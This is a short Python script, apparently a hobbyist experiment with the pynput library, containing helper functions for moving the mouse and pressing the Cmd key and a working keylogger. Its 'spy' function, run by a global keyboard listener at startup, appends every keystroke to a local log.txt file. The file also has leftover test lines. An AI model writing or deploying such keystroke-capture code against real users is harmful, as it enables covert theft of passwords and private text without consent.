from pynput import mouse, keyboard
# from pynput.keyboard import Key
import time
from pynput.keyboard import Key, Controller, Listener

# time.sleep(20)
# print("asd")


def ch():
    time.sleep(10)
    mousee = mouse.Controller()
    mousee.position = (100, 200)
# ch()


def kr():
    keyboard = Controller()
    # keyboards=keyboard.Controller()
    # keyboards.press(keyboards.key.cmd)
    # keyboards.release(keyboards.key.cmd)
    keyboard.press(Key.cmd)
    keyboard.release(Key.cmd)
# kr()


def spy(key):
    data = str(key)
    if data == "Key.space":
        data = " "
    with open("log.txt", 'a') as f:
        f.write(data.replace("'", ""))


with Listener(on_press=spy) as strok:
    strok.join()

input()
x="opkopj"